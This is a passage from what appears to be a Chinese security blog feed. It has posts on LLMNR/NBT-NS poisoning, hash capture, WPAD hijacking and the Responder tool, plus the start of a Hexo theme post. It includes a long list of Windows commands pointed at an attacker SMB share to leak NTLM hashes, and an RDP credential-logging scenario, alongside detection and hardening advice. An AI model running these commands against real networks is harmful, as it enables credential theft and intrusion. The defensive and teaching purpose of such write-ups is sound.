src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161019-9324c796-d413-1.png" alt="SMB 会话劫持，获取 HASH"></p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161027-97d2bfd2-d413-1.png" alt="使用 John 破解 SMB 会话劫持到的 HASH"></p><h4 id="使用-HTTP-401-认证获取-HASH"><a href="#使用-HTTP-401-认证获取-HASH" class="headerlink" title="使用 HTTP 401 认证获取 HASH"></a>使用 HTTP 401 认证获取 HASH</h4><p>使用 HTTP 401 认证同样也可以获取到客户端机器的 HASH，劫持会话进行钓鱼：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161042-a10626c0-d413-1.png" alt="HTTP 401 认证服务器钓鱼"></p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161056-a967b112-d413-1.png" alt="“钓鱼”攻击获取到了 HASH"></p><h3 id="劫持-WPAD-获取上网记录"><a href="#劫持-WPAD-获取上网记录" class="headerlink" title="劫持 WPAD 获取上网记录"></a>劫持 WPAD 获取上网记录</h3><p>在 Windows 系统中，默认启用了 WPAD 功能，可以对 <strong>IE 浏览器-工具-internet-连接-局域网设置-自动检测设置</strong> 和 <strong>系统服务</strong> 中的 <strong>WinHttpAutoProxySvc</strong> 服务进行开关设置。</p><p>启用了 WPAD 的主机，会持续请求名为 <strong>WPAD</strong> 的主机名称，因此可以利用 LLMNR Poison  攻击更改受害者主机的浏览器代理设置，这样就可以在攻击者自己的代理服务器中看到受害者的上网浏览记录，也可以在受害者正在访问的网页中嵌入任何你想要嵌入的恶意脚本代码，如各种钓鱼、弹框认证、下载文件等等。另外，由于  WPAD 是一个系统的 HTTP 代理设置，所以 Windows 更新也会使用这个代理，这样就可以利用 Windows  更新将木马下载到受害者主机并自动执行。</p><p>但是 WPAD 在实战中也同样会受到各种不可控的客观因素的影响，只有手动设置了浏览器代理配置，通过 WPAD 的代理上网的效果才比较明显。</p><h3 id="“剑走偏锋”-获取服务器密码"><a href="#“剑走偏锋”-获取服务器密码" class="headerlink" title="“剑走偏锋” 获取服务器密码"></a>“剑走偏锋” 获取服务器密码</h3><p>上面已经提到，在局域网中只要有主机使用其他主机的名称请求服务就可以产生名称解析行为，现在假定有这样一个场景，在渗透到内网后，进一步渗透的条件很苛刻，这时候你“黔驴技穷”了，为了能在内网中拿到一台服务器，以便“站稳脚跟”，或许你可以采用“剑走偏锋”的思路，利用  LLMNR Poison 攻击进行 3389 连接欺骗，拿到服务器的密码，这样做的确有些冒险，可是总好过你直接修改 IP 去欺骗登录要好很多！</p><p>测试环境如下：</p><ul><li>一台 Windows Server 2008 （Win2k8 支持 LLMNR）作为管理员的主机，IP：172.16.0.8</li><li>一台 Windows Server 2003 （假定为内网的一台服务器）机器名称：WIN2K3-3A85D681，IP：172.16.0.3</li><li>一台 Windows XP （已开 3389 为了演示效果所用），IP：172.16.0.100</li><li>一台 BT5-R3 攻击者的主机 （启动 Responder），IP：172.16.0.128</li></ul><p>场景如下：</p><p>管理员的主机（Win2k8）连接内网服务器（Win2k3）进行常规维护，攻击者（BT5-R3）利用 LLMNR Poison 攻击劫持了 3389 连接会话，<strong>为了更加明显的演示出攻击效果，我将 3389 连接会话重定向到一台 XP 中</strong>。</p><p>攻击效果如下：</p><p>管理员连接内网服务器，但是被LLMNR Poison攻击劫持，重定向到了XP上：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161109-b12561c4-d413-1.png" alt="管理员连接内网服务器"></p><p>从攻击者的机器中，也可以看到 Responder 做了“恶意”应答，同时，利用 lcx 转发的 3389 也有数据流动，可以从 IP 中判断出来：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161120-b761d7e8-d413-1.png" alt="攻击者机器"></p><p>在 XP 中预先安装某记录登录密码的程序，记录任何成功或失败的登录信息，可以看到管理员输入的登录信息：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161127-bbbb955e-d413-1.png" alt="Windows XP"></p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>关于 LLMNR Poison 攻击的实战思路还有很多，包括劫持 FTP，MySQL，MSSQL Server 等等，具体的实现可以自由发挥。</p><p>为了防止遭到 LLMNR Poison 攻击，可以导入下面的注册表键值关闭 LLMNR：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient&quot; /v EnableMulticast /t REG_DWORD /d 0 /f<br>reg add &quot;HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows NT\DNSClient&quot; /v EnableMulticast /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure><p>不过，关闭了 LLMNR 以后， 可能用户的一些正常需求会受到影响。</p><p><strong>参考文章：</strong><a href="https://xz.aliyun.com/t/1679/">https://xz.aliyun.com/t/1679/</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>Windows</tag>
      
      <tag>名称解析</tag>
      
      <tag>LLMNR</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Responder 内网渗透神器</title>
    <link href="/post/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/"/>
    <url>/post/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>Responder 是一款强大并且简单易用的内网渗透神器，可以劫持 LLMNR 和 NBT-NS 请求。</p><p>工作原理是，在域名解析过程中，如果客户端/目标无法通过 DNS 进行域名解析，则会回退到 LLMNR 和 NBT-NS 协议下进行解析，在 Responder 运行的情况下，会对所有能收到的 LLMNR 和 NBT-NS 请求进行欺骗性响应，然后将所有的数据流导向到攻击者的机器。</p><p><strong>下载地址：</strong></p><ol><li><a href="https://github.com/SpiderLabs/Responder">LLMNR/NBT-NS/mDNS Poisoner</a></li><li><a href="https://github.com/lgandx/Responder">LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay</a></li></ol><h2 id="0x01-功能特性"><a href="#0x01-功能特性" class="headerlink" title="0x01 功能特性"></a>0x01 功能特性</h2><ul><li><p>内置 SMB 认证服务器</p><p>默认支持带 NTLMSSP 安全扩展的 NTLMv1, NTLMv2 散列，已在 Windows 95 到 Windows Server 2012 RC, Samba 和 Mac OSX Lion 上成功测试。Windows NT4 支持明文密码，对于 Windows XP/2003 以及更早的版本，当设置 <code>--lm</code> 选项时，启用强制 LM 哈希降级。当工具启动时默认开启此功能，可以截获 Hash 进行 SMB 重放攻击（SMB Relay）。</p></li><li><p>内置 MSSQL 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 MSSQL 身份验证重定向到此工具（对于 Vista 和更高版本，Windows 将使用 LLMNR 协议）。该服务器支持 NTLMv1、LMv2 散列，已在 Windows SQL Server 2005 和 2008 上成功测试。</p></li><li><p>内置 HTTP 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 HTTP 身份验证重定向到此工具。该服务器支持 NTLMv1、NTLMv2 散列和基本身份验证，已在 IE 6 到 IE 10, Firefox, Chrome, Safari 上成功测试。</p><blockquote><p>注：此模块也适用于拦截 Windows WebDav 客户端（WebClient）发出的 WebDav NTLM 认证，可以向受害者发送任意文件。</p></blockquote></li><li><p>内置 HTTPS 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 HTTPS 身份验证重定向到此工具。</p><blockquote><p><code>certs/</code> 目录下有两个默认的证书文件，目的是使 Responder 可以更容易使用，你也可以根据需要使用脚本生成自签名密钥对。</p></blockquote></li><li><p>内置 LDAP 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 LDAP 身份验证重定向到此工具。该服务器已在 Windows支持工具 ldp 和 LdapAdmin 上成功测试。</p></li><li><p>内置 FTP, POP3, IMAP, SMTP 认证服务器</p><p>用于收集明文凭证。</p></li><li><p>内置 DNS 服务器</p><p>用于响应 A 类型的查询请求，结合 ARP 欺骗攻击将非常强大。</p></li><li><p>内置 WPAD 代理服务器</p><p><strong>这个模块非常有效</strong>，此模块将捕获网络中其他用户所有的 HTTP 请求。您可以在 <code>Responder.conf</code> 中配置自定义的 PAC 脚本文件，并将 HTML 代码注入服务器的响应中，具体细节可以看 <code>Responder.conf</code>。</p><p>该模块会抓取网络中的数据包,然后找到开启了Auto-detect settings的ie浏览器,然后向他注入PAC脚本具体可以看Responder.conf.</p><blockquote><p>注：需要用户在 IE 中启用了“自动检测设置”（Auto-detect settings）。</p></blockquote></li><li><p>Browser Listener</p><p>浏览器监听模块，该模块允许在隐身模式下找到 PDC。</p><blockquote><p>PDC：Primary Domain Controller（Microsoft Windows NT Server），主域控制器</p></blockquote></li><li><p>Fingerprinting</p><p>指纹识别模式，当使用 <code>-f</code> 选项时，Responder 会自动识别使用 LLMNR/NBT-NS 查询的主机指纹，所有捕获模块在指纹识别模式下仍然可以工作。</p></li><li><p>Icmp Redirect</p><p>ICMP 重定向攻击（ICMP Redirects）模块，适用于 Windows XP/2003 和更早版本的域成员间进行 MITM 中间人攻击，结合 DNS 服务器模块使用会相当有效。</p><blockquote><p>使用 python tools/Icmp-Redirect.py</p></blockquote></li><li><p>Rogue DHCP</p><p>DHCP 欺骗攻击（DHCP Inform Spoofing）模块，允许你让真正的 DHCP 服务器响应 DHCPINFORM 请求，从而设置你的 IP 地址为主 DNS 服务器，并设置你自己的 WPAD 代理服务器。</p><blockquote><p>使用 python tools/DHCP.py</p></blockquote></li><li><p>Analyze mode</p><p>分析模式，在模式下允许你查看网络上的 NBT-NS、BROWSER、LLMNR、DNS 请求，而不会进行任何攻击行为。此外，您还可以被动地映射域、MSSQL 服务器和工作站的网络拓扑，并查看 ICMP 重定向攻击在子网上是否可行。</p></li></ul><h2 id="0x02-选项参数"><a href="#0x02-选项参数" class="headerlink" title="0x02 选项参数"></a>0x02 选项参数</h2><blockquote><p>在使用前请查看 <code>Response .conf</code> 并根据您的需要进行调整。</p></blockquote><p>使用样例：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs reasonml">./<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Responder</span>.</span></span>py -I eth0 -wrf<br></code></pre></td></tr></table></figure><p>选项：</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-comment">--version             show program&#x27;s version number and exit</span><br>-h, <span class="hljs-comment">--help            show this help message and exit</span><br>-A, <span class="hljs-comment">--analyze         Analyze mode. This option allows you to see NBT-NS,</span><br>                      BROWSER, LLMNR requests without responding.<br>-I eth0, <span class="hljs-comment">--interface=eth0</span><br>                      Network interface <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span>, you can <span class="hljs-keyword">use</span> <span class="hljs-symbol">&#x27;ALL</span>&#x27; as a<br>                      wildcard <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> interfaces<br>-i <span class="hljs-number">10.0</span>.<span class="hljs-number">0.21</span>, <span class="hljs-comment">--ip=10.0.0.21</span><br>                      Local IP <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> (only <span class="hljs-keyword">for</span> OSX)<br>-e <span class="hljs-number">10.0</span>.<span class="hljs-number">0.22</span>, <span class="hljs-comment">--externalip=10.0.0.22</span><br>                      Poison <span class="hljs-keyword">all</span> requests <span class="hljs-keyword">with</span> another IP address than<br>                      Responder<span class="hljs-symbol">&#x27;s</span> one.<br>-b, <span class="hljs-comment">--basic           Return a Basic HTTP authentication. Default: NTLM</span><br>-r, <span class="hljs-comment">--wredir          Enable answers for netbios wredir suffix queries.</span><br>                      Answering <span class="hljs-keyword">to</span> wredir will likely break stuff <span class="hljs-keyword">on</span> the<br>                      network. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-d, <span class="hljs-comment">--NBTNSdomain     Enable answers for netbios domain suffix queries.</span><br>                      Answering <span class="hljs-keyword">to</span> domain suffixes will likely break stuff<br>                      <span class="hljs-keyword">on</span> the network. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-f, <span class="hljs-comment">--fingerprint     This option allows you to fingerprint a host that</span><br>                      issued an NBT-NS <span class="hljs-keyword">or</span> LLMNR query.<br>-w, <span class="hljs-comment">--wpad            Start the WPAD rogue proxy server. Default value is</span><br>                      <span class="hljs-literal">False</span><br>-u UPSTREAM_PROXY, <span class="hljs-comment">--upstream-proxy=UPSTREAM_PROXY</span><br>                      Upstream HTTP proxy used by the rogue WPAD Proxy <span class="hljs-keyword">for</span><br>                      outgoing requests (format: host:<span class="hljs-keyword">port</span>)<br>-F, <span class="hljs-comment">--ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file</span><br>                      retrieval. This may cause a login prompt. <span class="hljs-keyword">Default</span>:<br>                      <span class="hljs-literal">False</span><br>-P, <span class="hljs-comment">--ProxyAuth       Force NTLM (transparently)/Basic (prompt)</span><br>                      authentication <span class="hljs-keyword">for</span> the proxy. WPAD doesn<span class="hljs-symbol">&#x27;t</span> need <span class="hljs-keyword">to</span> be<br>                      <span class="hljs-keyword">ON</span>. This option <span class="hljs-keyword">is</span> highly effective <span class="hljs-keyword">when</span> combined <span class="hljs-keyword">with</span><br>                      -r. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br><span class="hljs-comment">--lm                  Force LM hashing downgrade for Windows XP/2003 and</span><br>                      earlier. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-v, <span class="hljs-comment">--verbose         Increase verbosity.</span><br></code></pre></td></tr></table></figure><h2 id="0x03-使用示例"><a href="#0x03-使用示例" class="headerlink" title="0x03 使用示例"></a>0x03 使用示例</h2><ul><li><p><strong>针对特定主机</strong></p><p>如果你想针对特定的 IP / IP范围，可以通过修改 <code>Responder.conf</code> 并更改 <strong>RespondTo</strong> 参数。当你只是想针对特定的目标时，这是非常有用的，因为你不希望导致整个网络的中断。此外，还可以通过改变 RespondToName 参数来指定 NBT-NS/LLMNR 名称。下图中，我们就是针对主机 192.168.253.130 进行的特定攻击。</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562575008600.png" alt="修改 Responder.conf 文件更改 RespondTo 参数"></p></li><li><p><strong>分析模式</strong></p><blockquote><p>使用 ./Responder.py -I eth0 -A 命令启用分析模式</p></blockquote><p>在 <code>-A</code> 分析模式下时，Responder 会被动监听网络中的事件，但不主动响应任何请求，如图所示：</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562576050781.png" alt="启动 Responder 分析模式 "></p></li><li><p><strong>WPAD 攻击</strong></p><blockquote><p>使用 ./Responder.py -I eth0 wrf 命令启动 WPAD 攻击</p></blockquote><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562659253546.png" alt="启动 Responder WPAD 攻击模式 "></p><p>对于 SMB 协议，客户端在连接服务端时，默认先使用本机的用户名和密码 Hash 尝试登录，因此可以模拟 SMB 服务器从而截获 Hash，执行如下命令都可以在攻击机得到 Hash：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs shell">net.exe use \\host\share<br>attrib.exe \\host\share<br>bcdboot.exe \\host\share<br>bdeunlock.exe \\host\share<br>cacls.exe \\host\share<br>certreq.exe \\host\share #(noisy, pops an error dialog)<br>certutil.exe \\host\share<br>cipher.exe \\host\share<br>ClipUp.exe -l \\host\share<br>cmdl32.exe \\host\share<br>cmstp.exe /s \\host\share<br>colorcpl.exe \\host\share #(noisy, pops an error dialog)<br>comp.exe /N=0 \\host\share \\host\share<br>compact.exe \\host\share<br>control.exe \\host\share<br>convertvhd.exe -source \\host\share -destination \\host\share<br>Defrag.exe \\host\share<br>DeployUtil.exe /install \\host\share<br>DevToolsLauncher.exe GetFileListing \\host\share #(this one&#x27;s cool. will return a file listing (json-formatted) from remote SMB share...)<br>diskperf.exe \\host\share<br>dispdiag.exe -out \\host\share<br>doskey.exe /MACROFILE=\\host\share<br>esentutl.exe /k \\host\share<br>expand.exe \\host\share<br>extrac32.exe \\host\share<br>FileHistory.exe \\host\share #(noisy, pops a gui)<br>findstr.exe * \\host\share<br>fontview.exe \\host\share #(noisy, pops an error dialog)<br>fvenotify.exe \\host\share #(noisy, pops an access denied error)<br>FXSCOVER.exe \\host\share #(noisy, pops GUI)<br>hwrcomp.exe -check \\host\share<br>hwrreg.exe \\host\share<br>icacls.exe \\host\share<br>LaunchWinApp.exe \\host\share #(noisy, will pop an explorer window with the  contents of your SMB share.)<br>licensingdiag.exe -cab \\host\share<br>lodctr.exe \\host\share<br>lpksetup.exe /p \\host\share /s<br>makecab.exe \\host\share<br>MdmDiagnosticsTool.exe -out \\host\share #(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)<br>mshta.exe \\host\share #(noisy, pops an HTA window)<br>msiexec.exe /update \\host\share /quiet<br>msinfo32.exe \\host\share #(noisy, pops a &quot;cannot open&quot; dialog)<br>mspaint.exe \\host\share #(noisy, invalid path to png error)<br>mspaint.exe \\host\share\share.png #(will capture hash, and display the remote PNG file to the user)<br>msra.exe /openfile \\host\share #(noisy, error)<br>mstsc.exe \\host\share #(noisy, error)<br>netcfg.exe -l \\host\share -c p -i foo<br></code></pre></td></tr></table></figure><p><strong>攻击流量情况：</strong></p></li></ul><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-02-02.png" alt="向受害者发送 NBNS 欺骗响应"></p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-12-06.png" alt="向受害者发送 LLMNR 欺骗响应"></p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-10-38.png" alt="重定向身份认证过程中 SMB 传输的用户名和 HASH 值 "></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><h3 id="特征流量检测"><a href="#特征流量检测" class="headerlink" title="特征流量检测"></a>特征流量检测</h3><ul><li><p>特征行为检测</p><p>程序在启动时会连续发送两个完全相同的 IGMPv3 数据包，请求同时加入 224.0.0.251 和 224.0.0.252 组播组，同样程序在退出时，也会发送两个相同的 IGMPv3 数据包，请求离开上述的组播组，如下图所示：</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-16-34.png" alt="Responder 工具 WPAD 攻击启动时行为"></p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-16-49.png" alt="Responder 工具 WPAD 攻击退出时行为 "></p></li><li><p>特殊协议捕获</p><p>对整个过程中使用的特殊协议进行捕获（主要为 SMB、LLMNR、NBNS、MDNS、IGMPv3、BROWSER），如果多个上述协议中的数据流量同时指向一个主机，则怀疑有可能受到攻击。</p></li><li><p>特征端口检测</p><p>该工具监听以下端口：UDP 137, UDP 138, UDP 53, UDP/TCP 389, TCP 1433, TCP 80, TCP 139, TCP 445, TCP 21, TCP 3141, TCP 25, TCP 110, TCP 587 和 多播 UDP 5553。</p><p>对这些特殊端口的流量要格外注意，并加强分析。</p></li><li><p>敏感内容检测</p><p>重点关注 SMB 数据包中所返回的明文内容，其包含用户在 NTML 验证过程中所使用的 Username、hash 值等，对敏感字符做特征匹配。</p></li></ul><h3 id="预防和修复"><a href="#预防和修复" class="headerlink" title="预防和修复"></a>预防和修复</h3><p>为了加强 Windows 系统的安全性，可以进行以下调整。</p><ul><li><p>通过组策略禁用 LLMNR</p><p>打开 gpedit.msc 到计算机配置 &gt; 管理 &gt; 网络 &gt; DNS 客户端 &gt; 关闭多播域名解析，并设置为已启用：</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562835661260.png" alt="关闭多播域名解析"></p></li><li><p>禁用 NetBIOS</p><p>这可以到以太网 &gt; 属性 &gt; IPv4 &gt; 属性 &gt; 高级 &gt; WINS，然后在“NetBIOS设置”下选择禁用 TCP/IP 上的 NetBIOS：</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562835661261.png" alt="禁用 TCP/IP 上的 NetBIOS "></p><blockquote><p>或者通过到注册表修改下面的键，并将值更改为2 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces{$ InterfaceID}\NetbiosOptions</p></blockquote></li><li><p>通过组策略启用 SMB 签名</p><p>SMB签名的更多细节以及可以定义的各种值可以在以下链接中找到：<br><a href="http://techgenix.com/secure-smb-connections/">http://techgenix.com/secure-smb-connections/</a><br><a href="https://technet.microsoft.com/en-us/library/jj852239(v=ws.11).aspx">https://technet.microsoft.com/en-us/library/jj852239(v=ws.11).aspx</a></p></li></ul><h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><ul><li><a href="https://github.com/SpiderLabs/Responder/blob/master/README.md">SpiderLabs/Responder - README.md</a></li><li><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/responder-20-owning-windows-networks-part-3/">Responder 2.0 - Owning Windows Networks part 3</a></li><li><a href="https://www.secpulse.com/archives/65503.html">渗透师指南之Responder</a></li><li><a href="https://www.jianshu.com/p/1b545a8b8b1e">内网渗透之Responder与Net-NTML hash</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
      <tag>WPAD</tag>
      
      <tag>LLMNR</tag>
      
      <tag>NBNS</tag>
      
      <tag>Responder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo yilia 主题优化方案</title>
    <link href="/post/Hexo%20yilia%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/"/>
    <url>/post/Hexo%20yilia%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<p>Hexo 虽然好用，但配置主题时遇到的坑确实是挺多的，网上大部分的回答都是复制粘贴、良莠不齐，所以把自己优化 yilia 主题的过程整理了一下，希望后来的人可以少走弯路。</p><h2 id="Hexo-主题优化"><a href="#Hexo-主题优化" class="headerlink" title="Hexo 主题优化"></a>Hexo 主题优化</h2><h3 id="修改-Hexo-配置文件"><a href="#修改-Hexo-配置文件" class="headerlink" title="修改 Hexo 配置文件"></a>修改 Hexo 配置文件</h3><p>配置根目录下的 <code>_config.yml</code> ：</p><figure class="highlight yaml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Site</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">eW1z4rd</span> <span class="hljs-string">树屋</span>  <span class="hljs-comment"># 网页标题</span><br><span class="hljs-attr">subtitle:</span> <span class="hljs-string">左手程式，右手诗</span>  <span class="hljs-comment"># 侧边菜单栏描述</span><br><span class="hljs-attr">author:</span> <span class="hljs-string">eW1z4rd</span>  <span class="hljs-comment"># 作者名</span><br><br><span class="hljs-comment"># URL</span><br><span class="hljs-attr">url:</span> <span class="hljs-string">https://eW1z4rd.github.io</span>  <span class="hljs-comment"># 网站链接</span><br><span class="hljs-attr">root:</span> <span class="hljs-string">/</span>  <span class="hljs-comment"># 网站根目录</span><br><span class="hljs-attr">permalink:</span> <span class="hljs-string">:year/:month/:day/:title/</span>  <span class="hljs-comment"># 文章路径格式</span><br><br><span class="hljs-comment"># Writing</span><br><span class="hljs-attr">post_asset_folder:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 生成资源文件夹</span><br><span class="hljs-attr">highlight:</span>  <span class="hljs-comment"># 代码高亮</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">line_number:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">auto_detect:</span> <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># Extensions</span><br><span class="hljs-attr">theme:</span> <span class="hljs-string">yilia</span>  <span class="hljs-comment"># 使用的主题</span><br><br><span class="hljs-comment"># Deployment</span><br><span class="hljs-attr">deploy:</span>  <span class="hljs-comment"># 部署到 Github Page</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span 